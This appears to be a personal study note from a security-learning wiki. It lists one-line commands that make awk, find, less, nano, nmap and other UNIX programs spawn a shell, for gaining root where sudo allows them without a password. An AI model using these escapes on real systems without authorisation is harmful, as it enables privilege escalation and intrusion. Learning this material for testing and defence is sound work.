# Shell Escapes

Many common UNIX applications allow you to escape to a shell. This is particularly useful if they can be run with NOPASSWD via sudo.

* `awk` — `awk 'BEGIN {system("/bin/sh")}'`
* `find` — `find . -exec /bin/sh \; -quit`
* `ftp` — `!/bin/sh`
* `iftop` — `!/bin/sh`
* `less` — `!/bin/sh`
* `man` — `!/bin/sh`
* `more` — `!/bin/sh` (may require TERM to be unset)
* `nano` — ^R^X followed by `reset; sh 1>&0 2>&0`
* `nmap` — create a file containing `os.execute("/bin/sh")` and then run `nmap --script=$FILE`
* `vim` — see “Set a Shell in ViM”

## References

* [TryHackMe: Complete Beginner](tryhackme-complete-beginner.md)
* [GTFOBins](https://gtfobins.github.io)
* [Enumerate “sudo” Access](enumerate-sudo-access.md)
* [Set a Shell in ViM](set-a-shell-in-vim.md)

- - - -

<span aria-hidden="true">👤</span> Nathan Acks  
<span aria-hidden="true">📅</span> October 31, 2021
